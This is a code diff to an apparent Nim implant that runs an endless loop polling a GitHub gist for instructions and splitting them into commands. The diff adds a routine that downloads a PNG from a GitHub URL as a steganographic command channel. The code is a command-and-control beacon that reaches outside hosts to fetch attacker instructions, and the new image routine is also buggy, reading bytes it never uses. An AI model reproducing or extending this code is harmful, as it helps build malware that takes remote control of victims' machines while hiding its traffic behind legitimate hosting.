@@ -28,11 +28,26 @@ proc get_instruction(location: string): Future[string] =
     client.close()
     return aResult
 
-proc handle_loop(location: string, sleep_amount: int) {.async.} =
+proc get_image(location: string): Future[seq[byte]] =
+    var stegResult = newFuture[seq[byte]]
+    var client = newHttpClient()
+    try:
+        downloadFile(client, location, "photo.png")
+        var stegfile = open("photo.png", FileMode.fmReadWriteExisting, -1)
+        var dest: array[stegfile.getFileSize(), uint8]
+        stegfile.readBytes(dest, 0, stegfile.getFileSize)
+        stegResult.complete()
+    except:
+        stegResult.fail(newException(OSError, "Failed to get picture"))
+    client.close()
+    return stegResult
+
+proc handle_loop(location: string, stego_location: string, sleep_amount: int) {.async.} =
     var sleep_time = sleep_amount * 1000
     var last_instruction = ""
     while true:
         var res = await get_instruction(location)
+        var steg_res = await get_image(stego_location)
         if last_instruction != res:
             last_instruction = res
             var command = res.split(" ")
@@ -44,6 +59,7 @@ when isMainModule:
     var gist_location: string
     var sleep_time = 5
     var default_gist = "https://gist.githubusercontent.com/bartimus-primed/4042ba41ec3a4b30633f0395874363f3/raw"
+    var default_stego = "https://raw.githubusercontent.com/bartimus-primed/gist_loader/master/test.png"
     var args = initOptParser("")
     while true:
         args.next()
@@ -64,4 +80,4 @@ when isMainModule:
             echo(&"ERROR: --gist=USERNAME/GIST_ID needs to be a Valid HTTP/HTTPS gist endpoint")
     if gist_location == "":
         gist_location = default_gist
-    waitFor handle_loop(gist_location, sleep_time)
+    waitFor handle_loop(gist_location, default_stego, sleep_time)
